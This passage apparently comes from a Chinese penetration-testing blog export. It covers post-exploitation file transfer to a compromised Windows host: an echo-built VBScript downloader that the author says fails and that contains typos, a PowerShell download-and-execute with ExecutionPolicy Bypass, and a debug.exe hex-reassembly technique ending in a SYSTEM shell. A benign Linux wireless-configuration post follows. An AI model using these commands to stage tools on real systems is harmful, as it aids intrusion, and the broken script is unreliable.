<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Err.Clear &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = CreateObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;WinHttp.WinHttpRequest&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;WinHttp.MSXML2.ServerXMLHTTP&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> http.Open <span class="string">&quot;GET&quot;</span>,strURL,False &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> http.Send &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = Noting &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set fs = CreateObject(<span class="string">&quot;Scrippting.FileSystemObject&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> strData = <span class="string">&quot;&quot;</span> &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> strBuffer = <span class="string">&quot;&quot;</span> &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Next &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>
<p>将以上命令粘贴到 shell 窗口后再执行cscript wget.vbs
http://10.10.10.171/whoami.exe
w.exe（windows系统自带的cscipt命令去下载whoami.exe 命名成w.exe）</p>
<p><strong>脚本执行报错信息（未解决，哪位大佬看出问题了，烦请指导下，感激不尽）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;cscript wget.vbs http://10.10.10.171/whoami.exe whoami.exe</span><br><span class="line">cscript wget.vbs http://10.10.10.171/whoami.exe whoami.exe</span><br><span class="line">Microsoft (R) Windows Script Host Version 5.7</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wget.vbs(3, 6) Microsoft VBScript compilation error: Syntax error</span><br></pre></td></tr></table></figure>
<h3 id="powershell传输">4、POWERSHELL传输</h3>
<p>类似vbs的传输，依旧是到目标服务器下载程序，注意需在win7,win8以后的系统运行。</p>
<p><strong>命令集</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$strongeDir</span> = <span class="variable">$pwd</span></span><br><span class="line"><span class="variable">$webclient</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://10.10.10.171/whoami.exe&quot;</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;new-exsploit.exe&quot;</span></span><br><span class="line"><span class="variable">$webclient</span> DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure>
<p><strong>执行脚本：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1</span><br></pre></td></tr></table></figure>
<h3 id="debug传输">5、Debug传输</h3>
<p>Debug是一种汇编、反汇编的16进制dump工具，作为文件传输，默认情况下
<strong>只能传输64k字节的数据</strong>
，并且可以修改Bios，考虑我们能不能直接把二进制的文件一行一行地echo进一个文件中，答案是否定的，不过这个思路是可以的，我们需要变通一下，将二进制文件转换成文本类型，之后进行传输，最后再用debug命令转化为二进制格式。</p>
<p><strong>Kali 端的压缩</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/test<span class="comment"># ls -alh whoami.exe </span></span><br><span class="line">-rwxr-xr-x 1 root root 65K Feb  7 03:09 whoami.exe</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># upx -9 whoami.exe     #-9：最高程度的压缩</span></span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">     66560 -&gt;     21113   31.72%    win32/pe     whoami.exe                    </span><br><span class="line"></span><br><span class="line">Packed 1 file.</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># ls -alh whoami.exe </span></span><br><span class="line">-rwxr-xr-x 1 root root 21K Feb  7 03:09 whoami.exe</span><br></pre></td></tr></table></figure>
<p><strong>将需要传的二进制文件转换为文本文件</strong></p>
<p><strong>以whoami.exe为例（将/usr/share/windows-binaries/exe2bat.exe和whoami.exe拷贝到windows下）：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207161845658-1776705172.png" /></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207161926497-359527144.png" /></p>
<p>当然kali下也可以转换，只不过需要安装window程序的执行环境（wine）</p>
<p>详情参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15864240.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15864240.html</a></p>
<p><strong>传输文件</strong></p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> n 1.dll <span class="op">&gt;</span>123.hex</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> e 0100 <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  <span class="op">&gt;&gt;</span>123.hex </span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> e 0180 <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> r cx <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> 5279 <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> w <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> q <span class="op">&gt;&gt;</span>123.hex</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;</span></span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:54 PM                30 1.txt</span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            65,516 123.hex</span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">9</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>         <span class="ex">68,007</span> bytes</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,635,136</span> bytes free</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;debug</span><span class="op">&lt;</span>123.hex</span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a>    <span class="ex">debug</span><span class="op">&lt;</span>123.hex</span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-n</span> 1.dll </span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-e</span> 0100 </span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0100</span>  24.</span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a>    <span class="ex">4d</span>   99.5a   04.90   80.00   0E.03   1E.00   99.00   04.00   </span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0108</span>  80.04   3E.00   1F.00   99.00   00.ff   75.ff   24.00   80.00   </span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0110</span>  3E.b8   62.00   97.00   01.00   74.00   1D.00   E8.00   5B.00   </span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0118</span>  03.40   75.00   18.00   80.00   34.00   00.00   B9.00   0A.00   </span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0120</span>  75.00   11.00   BA.00   EC.00   89.00   E8.00   4B.00   10.00   </span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0128</span>  C7.00   06.00   21.00   96.00   00.00   00.00   FE.00   06.00   </span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0130</span>  23.00   99.00   C3.00   8B.00   1E.00   5F.00   98.00   33.00 </span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:5370</span>  00.00   00.00   00.00   00.00   00.00   00.00   00.00   00.00   </span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:5378</span>  00.00   00.     00.     00.</span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-r</span> cx </span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a>    <span class="ex">CX</span> 0000</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a>    <span class="ex">:5279</span> </span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-w</span> </span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Writing</span> 05279 bytes</span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-q</span> </span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            21,113 1.DLL</span>
<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02/07/2022</span>  12:54 PM                30 1.txt</span>
<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            65,516 123.hex</span>
<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a>                  <span class="ex">10</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>         <span class="ex">89,120</span> bytes</span>
<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,598,272</span> bytes free</span>
<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;copy</span> 1.dll whoami.exe</span>
<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a>    <span class="ex">copy</span> 1.dll whoami.exe</span>
<span id="cb1-93"><a href="#cb1-93" aria-hidden="true" tabindex="-1"></a>            <span class="ex">1</span> file<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">copied.</span></span>
<span id="cb1-94"><a href="#cb1-94" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-95"><a href="#cb1-95" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
<span id="cb1-96"><a href="#cb1-96" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
<span id="cb1-97"><a href="#cb1-97" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
<span id="cb1-98"><a href="#cb1-98" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
<span id="cb1-99"><a href="#cb1-99" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-100"><a href="#cb1-100" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
<span id="cb1-101"><a href="#cb1-101" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-102"><a href="#cb1-102" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            21,113 1.DLL</span>
<span id="cb1-103"><a href="#cb1-103" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            65,516 123.hex</span>
<span id="cb1-104"><a href="#cb1-104" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
<span id="cb1-105"><a href="#cb1-105" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
<span id="cb1-106"><a href="#cb1-106" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
<span id="cb1-107"><a href="#cb1-107" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
<span id="cb1-108"><a href="#cb1-108" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
<span id="cb1-109"><a href="#cb1-109" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
<span id="cb1-110"><a href="#cb1-110" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
<span id="cb1-111"><a href="#cb1-111" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
<span id="cb1-112"><a href="#cb1-112" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
<span id="cb1-113"><a href="#cb1-113" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
<span id="cb1-114"><a href="#cb1-114" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
<span id="cb1-115"><a href="#cb1-115" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
<span id="cb1-116"><a href="#cb1-116" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            21,113 whoami.exe</span>
<span id="cb1-117"><a href="#cb1-117" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
<span id="cb1-118"><a href="#cb1-118" aria-hidden="true" tabindex="-1"></a>                  <span class="ex">10</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>        <span class="ex">110,203</span> bytes</span>
<span id="cb1-119"><a href="#cb1-119" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,573,696</span> bytes free <span class="pp">**</span>C:\ <span class="op">&gt;</span>whoami</span>
<span id="cb1-120"><a href="#cb1-120" aria-hidden="true" tabindex="-1"></a>    <span class="fu">whoami</span><span class="pp">**</span> <span class="pp">**</span>NT AUTHORITY\SYSTEM<span class="pp">**</span></span>
<span id="cb1-121"><a href="#cb1-121" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb1-122"><a href="#cb1-122" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;</span></span></code></pre></div>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 无线协议栈及配置命令</title>
    <url>/2022/03/20/Linux%20%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="协议栈">1. 802.11 协议栈</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320171034128-1071200619.png" /></p>
<h2 id="无线网卡配置">2. 无线网卡配置</h2>
<h3 id="查看无线网卡">1、查看无线网卡</h3>
<ul>
<li><strong>ifconfig</strong></li>
<li><strong>iwconfig</strong></li>
<li><strong>iw list</strong></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># iwconfig </span></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># iw list  #可以列出网卡支持的加密方法，接口模式，信道，功率以及命令等</span></span><br><span class="line">Wiphy phy0</span><br><span class="line">    max <span class="comment"># scan SSIDs: 4</span></span><br><span class="line">    max scan IEs length: 2257 bytes</span><br><span class="line">    max <span class="comment"># sched scan SSIDs: 0</span></span><br><span class="line">    max <span class="comment"># match sets: 0</span></span><br><span class="line">    max <span class="comment"># scan plans: 1</span></span><br><span class="line">    max scan plan interval: -1</span><br><span class="line">    max scan plan iterations: 0</span><br><span class="line">    Retry short long <span class="built_in">limit</span>: 2</span><br><span class="line">    Coverage class: 0 (up to 0m)</span><br><span class="line">    Device supports RSN-IBSS.</span><br><span class="line">    Supported Ciphers:</span><br><span class="line">        * WEP40 (00-0f-ac:1)</span><br><span class="line">        * WEP104 (00-0f-ac:5)</span><br><span class="line">        * TKIP (00-0f-ac:2)</span><br><span class="line">        * CCMP-128 (00-0f-ac:4)</span><br><span class="line">        * CCMP-256 (00-0f-ac:10)</span><br><span class="line">        * GCMP-128 (00-0f-ac:8)</span><br><span class="line">        * GCMP-256 (00-0f-ac:9)</span><br><span class="line">    Available Antennas: TX 0 RX 0</span><br><span class="line">    Supported interface modes:</span><br><span class="line">         * IBSS</span><br><span class="line">         * managed</span><br><span class="line">         * AP</span><br><span class="line">         * AP/VLAN</span><br><span class="line">         * monitor</span><br><span 